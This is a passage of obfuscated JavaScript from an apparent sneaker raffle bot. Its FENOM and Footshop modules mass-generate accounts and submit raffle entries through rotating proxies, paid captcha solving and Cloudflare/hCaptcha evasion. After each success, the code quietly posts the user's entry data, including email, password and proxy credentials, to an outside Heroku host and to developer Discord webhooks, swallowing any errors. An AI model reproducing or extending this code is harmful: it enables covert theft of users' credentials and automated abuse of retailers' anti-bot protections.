                                _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x5943f3['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x5943f3['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x5943f3['succesPUBMSG']);
                            } catch (_0xe341a1) {
                                console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xe341a1));
                            }
                            _0x47cb76 = 'no';
                        } catch (_0x31759a) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20' + _0x31759a)), _0x3b7e01 = '' + _0x31759a;
                            var _0x1304b0 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', !![], _0x3b7e01), _0x32c226 = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'dev', ![]), _0x7eb5cc = await _0x1bd114(_0x5f423c[_0x2128e2], _0x38fd2f, 'pub', ![]);
                            const _0x402e17 = {
                                'succesDEVMSG': { 'embeds': [_0x32c226] },
                                'succesPUBMSG': { 'embeds': [_0x7eb5cc] }
                            };
                            _0x402e17['errorDEV'] = { 'embeds': [_0x1304b0] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x402e17['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x402e17['errorDEV']), _0x47cb76 = 'yes';
                        } finally {
                            _0x52f10a && _0x52f10a['close']();
                            if (_0x47cb76 == 'yes' && _0x23a490 != 0x5) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x38fd2f['name'] + ']\x20Task\x20' + (_0x2128e2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x23a490 + '\x20/\x205)')), _0x2128e2 = _0x2128e2 - 0x1, _0x23a490 = _0x23a490 + 0x1;
                                continue;
                            }
                            _0x47cb76 == 'yes' && _0x23a490 >= 0x5 && (_0x3fe3d2(_0x5f423c[_0x2128e2], _0x38fd2f), _0x47cb76 = 'no', _0x23a490 = 0x0), console['log']('Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2dd550, _0x4371e1, _0x52314a) {
                    var _0xc6c3a6 = _0x4371e1, _0x5d7535 = 0x0;
                    for (var _0x3bc60b = 0x0; _0x3bc60b < _0x4371e1['length']; _0x3bc60b++) {
                        maxTasks = Number(_0x1d78d4['threads']);
                        while (_0x5d7535 >= maxTasks) {
                            await _0x73bf2c(_0x1d78d4['delay']);
                        }
                        let _0x30656a = ![];
                        async function _0xde3485(_0x1e957d, _0x40b661, _0x5cb2ff, _0x5b8599, _0xb94776) {
                            _0x5d7535++, _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x1d78d4['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x529ae7 != 'yes')
                                var _0x529ae7 = '', _0xb94776 = 0x0;
                            var _0x503ce2;
                            try {
                                await _0x4b6344(_0x40b661, _0x5b8599);
                            } catch {
                                _0x529ae7 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x3ec78c(_0x1e957d['name'] + '\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20/\x20' + _0x40b661['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                            var _0x369d12 = await _0x1bd114(_0x40b661[_0x5b8599], _0x1e957d, 'acc', ![]);
                            const _0x58467c = { 'succesDEVMSG': { 'embeds': [_0x369d12] } }, _0x239ade = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x1a5fb3 = Math['round'](Math['random']() * (_0x5cb2ff['length'] - 0x1)), _0x4fecf2 = _0x5cb2ff[_0x1a5fb3]['split'](':'), _0x417aa9;
                            async function _0x463e71(_0x5e4ef0) {
                                const _0x24f9db = _0x57b36f['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x486087 = _0x296e07['parse'](_0x24f9db, { 'header': !![] })['data'];
                                let _0x3a08d3 = ![];
                                for (var _0x32408a of _0x486087) {
                                    if (_0x32408a['Email'] == _0x5e4ef0['Email']) {
                                        _0x3a08d3 = !![];
                                        break;
                                    }
                                }
                                return _0x3a08d3;
                            }
                            try {
                                if (await _0x463e71(_0x40b661[_0x5b8599]) == !![]) {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x30656a = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x417aa9 = await _0x1f8a8f['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4fecf2[0x0] + ':' + _0x4fecf2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x417aa9 = await _0x1f8a8f['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x4fecf2[0x0] + ':' + _0x4fecf2[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x557ae6 = await _0x417aa9['newPage']();
                                await _0x557ae6['setViewport']({
                                    'width': 0x500 + _0x52c272(0x1, 0x32),
                                    'height': 0x2d9 + _0x52c272(0x1, 0x32)
                                });
                                const _0x577d48 = await _0x557ae6['target']()['createCDPSession'](), { windowId: _0x25bc78 } = await _0x577d48['send']('Browser.getWindowForTarget');
                                await _0x557ae6['authenticate']({
                                    'username': '' + _0x4fecf2[0x2],
                                    'password': '' + _0x4fecf2[0x3]
                                }), console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x557ae6['goto']('' + _0x239ade, { 'waitUntil': 'networkidle2' }), console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x73bf2c(0x1388);
                                var _0xff8c0a = await _0x557ae6['$']('.hcaptcha-box');
                                if (_0xff8c0a) {
                                    console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x73bf2c(0x2710);
                                    const _0x3cf274 = await _0x557ae6['$']('.hcaptcha-box');
                                    if (_0x3cf274)
                                        try {
                                            await _0x3cf274['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x557ae6['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x2b9562 = await _0x557ae6['$']('.hcaptcha-box');
                                        if (_0x2b9562)
                                            try {
                                                await _0x2b9562['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x557ae6['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x577d48['send']('Browser.setWindowBounds', {
                                        'windowId': _0x25bc78,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x73bf2c(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x557ae6['type']('input[name=\x22firstname\x22]', '' + _0x40b661[_0x5b8599]['FirstName']), await _0x73bf2c(0x1f4), await _0x557ae6['type']('input[name=\x22lastname\x22]', '' + _0x40b661[_0x5b8599]['LastName']), await _0x73bf2c(0x1f4), await _0x557ae6['type']('input[name=\x22email\x22]', '' + _0x40b661[_0x5b8599]['Email']), await _0x73bf2c(0x1f4), await _0x557ae6['type']('input[name=\x22password\x22]', '' + _0x40b661[_0x5b8599]['Password']), await _0x73bf2c(0x258), await _0x557ae6['$eval']('input[name=\x22psgdpr\x22]', _0xba530d => _0xba530d['click']()), await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x557ae6['$eval']('#customer-form', _0x53e21b => _0x53e21b['submit']());
                                try {
                                    try {
                                        await _0x557ae6['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x529ae7 = 'no', console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Account\x20' + _0x40b661[_0x5b8599]['Email'] + '\x20Generated')), _0x57b36f['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x40b661[_0x5b8599]['Email'] + ',' + _0x40b661[_0x5b8599]['Password']);
                                    let _0x46b4c7 = _0x40b661[_0x5b8599];
                                    try {
                                        prxdata = {
                                            'username': _0x5c7ae6['replace']('#', ''),
                                            'module': _0x1e957d['name'],
                                            'entrydata': JSON['stringify'](_0x46b4c7),
                                            'proxy': '' + _0x5cb2ff[_0x5b8599]
                                        };
                                        var _0x1a73f7 = JSON['stringify'](prxdata);
                                        let _0x2546c5 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x1a73f7, _0x2546c5);
                                    } catch (_0x3de267) {
                                    }
                                    try {
                                        _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x58467c['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x5cd94d(_0x2ffc54, _0x58467c['succesDEVMSG']);
                                } catch (_0xe72028) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x1afb97) {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20' + _0x1afb97)), _0x503ce2 = '' + _0x1afb97;
                                var _0x1b2784 = await _0x1bd114(_0x40b661[_0x5b8599], _0x1e957d, 'acc', !![], _0x503ce2);
                                _0x58467c['errorDEV'] = { 'embeds': [_0x1b2784] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x58467c['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x58467c['errorDEV']), _0x529ae7 = 'yes';
                            } finally {
                                _0x417aa9 && _0x417aa9['close']();
                                if (_0x529ae7 == 'yes' && _0xb94776 != 0x5)
                                    return console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Task\x20' + (_0x5b8599 + 0x1) + '\x20:\x20Retrying\x20(' + _0xb94776 + '\x20/\x205)')), _0xb94776 = _0xb94776 + 0x1, _0x5d7535--, _0xde3485(_0x1e957d, _0x40b661, _0x5cb2ff, _0x5b8599, _0xb94776);
                                _0x529ae7 == 'yes' && _0xb94776 >= 0x5 && _0x3fe3d2(_0x40b661[_0x5b8599], _0x1e957d), !_0x30656a && (console['log'](_0x4ea3c7() + '\x20[' + _0x1e957d['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay'])), _0x5d7535--;
                            }
                        }
                        _0xde3485(_0x2dd550, _0xc6c3a6, _0x52314a, _0x3bc60b), !_0x30656a && await _0x73bf2c(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x58dc5a(_0x4e49c0, _0x34fc52, _0x1bb494) {
                    _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1d78d4['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xa8157b = 0x0; _0xa8157b < _0x34fc52['length']; _0xa8157b++) {
                        if (_0x208bbe != 'yes')
                            var _0x208bbe = '', _0x53d0db = 0x0;
                        var _0x1e9012;
                        try {
                            await _0x4b6344(_0x34fc52, _0xa8157b);
                        } catch {
                            _0x208bbe = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3ec78c(_0x4e49c0['name'] + '\x20Task\x20' + (_0xa8157b + 0x1) + '\x20/\x20' + _0x34fc52['length'] + '\x20||\x20File:\x20' + _0x3fcfb6 + '\x20Proxies:\x20' + _0x1a359b);
                        const _0x4dca86 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x2e1441 = Math['round'](Math['random']() * (_0x1bb494['length'] - 0x1)), _0x271f59 = _0x1bb494[_0x2e1441]['split'](':'), _0xac940;
                        try {
                            _0xac940 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x271f59[0x0] + ':' + _0x271f59[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xac940 = await _0x1f8a8f['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x271f59[0x0] + ':' + _0x271f59[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5cb46d = await _0xac940['newPage'](), _0x3cafe9 = await _0x5cb46d['target']()['createCDPSession'](), { windowId: _0x2b41a6 } = await _0x3cafe9['send']('Browser.getWindowForTarget');
                            await _0x5cb46d['authenticate']({
                                'username': '' + _0x271f59[0x2],
                                'password': '' + _0x271f59[0x3]
                            }), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5cb46d['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x73bf2c(0x1388);
                            var _0xbe53c0 = await _0x5cb46d['$']('.hcaptcha-box');
                            if (_0xbe53c0) {
                                console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x73bf2c(0x2710);
                                const _0x5e53a2 = await _0x5cb46d['$']('.hcaptcha-box');
                                if (_0x5e53a2)
                                    try {
                                        await _0x5e53a2['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5cb46d['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x239b7d = await _0x5cb46d['$']('.hcaptcha-box');
                                    if (_0x239b7d)
                                        try {
                                            await _0x239b7d['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x3cafe9['send']('Browser.setWindowBounds', {
                                'windowId': _0x2b41a6,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x73bf2c(0x1f40);
                            try {
                                await _0x5cb46d['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x73bf2c(0x1388), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Logging\x20in'), await _0x5cb46d['type']('input[name=\x22email\x22]', '' + _0x34fc52[_0xa8157b]['Email']), await _0x73bf2c(0x1f4), await _0x5cb46d['type']('input[name=\x22password\x22]', '' + _0x34fc52[_0xa8157b]['Password']), await _0x73bf2c(0x258), await _0x5cb46d['$eval']('#login-form', _0x3729d7 => _0x3729d7['submit']()), await _0x5cb46d['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x73bf2c(0x1f4), await _0x5cb46d['goto']('' + _0x34fc52[_0xa8157b]['Url']), await _0x5cb46d['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x34fc52[_0xa8157b]['Size']);
                            if (_0x34fc52[_0xa8157b]['Size'] != 'RANDOM') {
                                var _0x4e513a = '\x20' + _0x34fc52[_0xa8157b]['Size'] + '\x20';
                                const _0x44698c = await _0x5cb46d['$x']('//span[contains(text(),\x20' + _0x4e513a + ')]');
                                await _0x44698c[0x0]['click']();
                            } else {
                                const _0x930b6d = await _0x5cb46d['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x1b2838 = Math['round'](Math['random']() * (_0x930b6d['length'] - 0x1));
                                await _0x930b6d[_0x1b2838]['click']();
                            }
                            await _0x73bf2c(0x258), await _0x5cb46d['click']('#cookieChoiceDismiss'), await _0x73bf2c(0x3e8), await _0x5cb46d['type']('#instagram-account', '' + _0x34fc52[_0xa8157b]['Follower']), await _0x73bf2c(0x28a), await _0x5cb46d['click']('#book-btn'), await _0x73bf2c(0xbb8);
                            try {
                                await _0x5cb46d['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x73bf2c(0x1f4), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20' + _0x11085b['cyan']('Solving\x20Captcha')), await _0x5cb46d['solveRecaptchas'](), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x73bf2c(0x7d0), await _0x5cb46d['$eval']('#book-btn-for-sure', _0x116bd1 => _0x116bd1['click']()), await _0x73bf2c(0x12c), await _0x5cb46d['click']('#book-btn-for-sure'), await _0x73bf2c(0xdac);
                            const _0x2d520d = await _0x5cb46d['$eval']('.reservation-popup\x20>\x20.title', _0x257932 => {
                                return _0x257932['innerHTML'];
                            });
                            if (_0x2d520d) {
                                _0x208bbe = 'no', _0x5584d0(_0x34fc52[_0xa8157b], _0x4e49c0), console['log'](_0x11085b['green'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0xe0e4f8 = await _0x1bd114(_0x34fc52[_0xa8157b], _0x4e49c0, 'dev', ![]), _0x43b784 = await _0x1bd114(_0x34fc52[_0xa8157b], _0x4e49c0, 'pub', ![]);
                                let _0x5438e1 = _0x34fc52[_0xa8157b];
                                try {
                                    prxdata = {
                                        'username': _0x5c7ae6['replace']('#', ''),
                                        'module': _0x4e49c0['name'],
                                        'entrydata': JSON['stringify'](_0x5438e1),
                                        'proxy': '' + _0x1bb494[_0xa8157b]
                                    };
                                    var _0x3f26f5 = JSON['stringify'](prxdata);
                                    let _0x24da44 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3d9190['post']('https://jraffles.herokuapp.com/success', _0x3f26f5, _0x24da44);
                                } catch (_0x2b08a5) {
                                }
                                const _0x2393f6 = {
                                    'succesDEVMSG': { 'embeds': [_0xe0e4f8] },
                                    'succesPUBMSG': { 'embeds': [_0x43b784] }
                                };
                                try {
                                    _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x2393f6['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x492271, _0x2393f6['succesDEVMSG']), await _0x73bf2c(0xc8), await _0x5cd94d(_0x323e07, _0x2393f6['succesPUBMSG']);
                                } catch (_0x2f84a4) {
                                    console['log'](_0x11085b['yellow'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2f84a4));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x4ad8af) {
                            console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20' + _0x4ad8af)), _0x1e9012 = '' + _0x4ad8af;
                            var _0x40b587 = await _0x1bd114(_0x34fc52[_0xa8157b], _0x4e49c0, 'dev', !![], _0x1e9012), _0xe0e4f8 = await _0x1bd114(_0x34fc52[_0xa8157b], _0x4e49c0, 'dev', ![]), _0x43b784 = await _0x1bd114(_0x34fc52[_0xa8157b], _0x4e49c0, 'pub', ![]);
                            const _0x4e842f = {
                                'succesDEVMSG': { 'embeds': [_0xe0e4f8] },
                                'succesPUBMSG': { 'embeds': [_0x43b784] }
                            };
                            _0x4e842f['errorDEV'] = { 'embeds': [_0x40b587] }, _0x1d78d4['webhook'] != undefined && _0x1d78d4['webhook'] != '' && await _0x5cd94d(_0x1d78d4['webhook'], _0x4e842f['errorDEV']), await _0x5cd94d(_0xfda3c6, _0x4e842f['errorDEV']), _0x4ad8af != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x208bbe = 'yes');
                        } finally {
                            _0xac940['close']();
                            if (_0x208bbe == 'yes' && _0x53d0db != 0x5 && _0x1e9012 != 'Size\x20Not\x20Found') {
                                console['log'](_0x11085b['red'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Task\x20' + (_0xa8157b + 0x1) + '\x20:\x20Retrying\x20(' + _0x53d0db + '\x20/\x205)')), _0xa8157b = _0xa8157b - 0x1, _0x53d0db = _0x53d0db + 0x1;
                                continue;
                            }
                            _0x208bbe == 'yes' && _0x53d0db >= 0x5 && (_0x3fe3d2(_0x34fc52[_0xa8157b], _0x4e49c0), _0x208bbe = 'no', _0x53d0db = 0x0), console['log'](_0x4ea3c7() + '\x20[' + _0x4e49c0['name'] + ']\x20Waiting\x20for\x20' + _0x1d78d4['delay'] + '\x20ms'), await _0x73bf2c(_0x1d78d4['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x1eccb8, _0x2342b6, _0x50eda3) {
                _0x1f8a8f['use'](_0x2f231a()), _0x1f8a8f['use'](_0x561a9c({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x1d78d4['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0xb7b0a5 = 0x0; _0xb7b0a5 < _0x2342b6['length']; _0xb7b0a5++) {
                    var _0x15c4cf;
                    if (_0x2081ba != 'yes')
                        var _0x2081ba = '', _0x4f9345 = 0x0;
                    var _0x55e8d6 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x5c7ae6
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x2342b6[_0xb7b0a5]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x2342b6[_0xb7b0a5]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x1d78d4['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x152cdf
                            }
                        ]
                    }], _0x419518 = await _0x1bd114(_0x2342b6[_0xb7b0a5], _0x1eccb8, 'dev', ![]), _0xedaa9c = await _0x1bd114(_0x2342b6[_0xb7b0a5], _0x1eccb8, 'pub', ![]);
                    const _0x2e9134 = {
                        'succesDEVMSG': { 'embeds': [_0x419518] },
                        'succesPUBMSG': { 'embeds': [_0xedaa9c] }
                    }, _0x95d8bd = { 'embeds': _0x55e8d6 };
                    try {
                        await _0x4b6344(_0x2342b6, _0xb7b0a5);
                    } catch {
                        _0x2081ba = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x2342b6[_0xb7b0a5]['Email'] == '' || _0x2342b6[_0xb7b0a5]['FirstName'] == '' || _0x2342b6[_0xb7b0a5]['LastName'] == '' || _0x2342b6[_0xb7b0a5]['Country'] == '' || _0x2342b6[_0xb7b0a5]['Size'] == '' || _0x2342b6[_0xb7b0a5]['Address1'] == '' || _0x2342b6[_0xb7b0a5]['Zip'] == '') {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x2342b6[_0xb7b0a5]['Email'] == '' || _0x2342b6[_0xb7b0a5]['FirstName'] == '' || _0x2342b6[_0xb7b0a5]['LastName'] == '' || _0x2342b6[_0xb7b0a5]['Country'] == '' || _0x2342b6[_0xb7b0a5]['Size'] == '' || _0x2342b6[_0xb7b0a5]['Address1'] == '' || _0x2342b6[_0xb7b0a5]['Zip'] == '' || _0x2342b6[_0xb7b0a5]['Phone'] == '') {
                        console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4cf96a = '' + _0x2342b6[_0xb7b0a5]['Url'];
                    if (_0x1d78d4['useRandomProxy'] = ![])
                        var _0x30eb97 = _0x50eda3[_0xb7b0a5]['split'](':');
                    else
                        var _0x5f50b2 = Math['round'](Math['random']() * (_0x50eda3['length'] - 0x1)), _0x30eb97 = _0x50eda3[_0x5f50b2]['split'](':');
                    var _0x45b071;
                    try {
                        _0x45b071 = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30eb97[0x0] + ':' + _0x30eb97[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x45b071 = await _0x1f8a8f['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x30eb97[0x0] + ':' + _0x30eb97[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x360355 = await _0x45b071['newPage']();
                        await _0x360355['authenticate']({
                            'username': '' + _0x30eb97[0x2],
                            'password': '' + _0x30eb97[0x3]
                        }), console['log'](_0x4ea3c7() + '\x20[' + _0x1eccb8['name'] + ']\x20Task\x20' + (_0xb7b0a5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x360355['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x360355['setRequestInterception'](!![]), _0x360355['on']('request', _0x14ebe0 => {
                            _0x14ebe0['resourceType']() === 'image' || _0x14ebe0['resourceType']() === 'font' || _0x14ebe0['resourceType']() === 'media' ? _0x14ebe0['abort']() : _0x14ebe0['continue']();
                        });
                        try {
                            await _0x360355['goto'](_0x4cf96a), await _0x73bf2c(0xbb8), await _0x360355['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x360355['click']('.control__JhutY'), await _0x73bf2c(0x1f4);
                        if (_0x2342b6[_0xb7b0a5]['Size'] != 'RANDOM')
                            try {
                                const _0xadff6b = await _0x360355['$x']('//div[contains(text(),\x20\x27' + _0x2342b6[_0xb7b0a5]['Size'] + '\x27)]');
                                await _0xadff6b[0x0]['click']();
                            } catch {
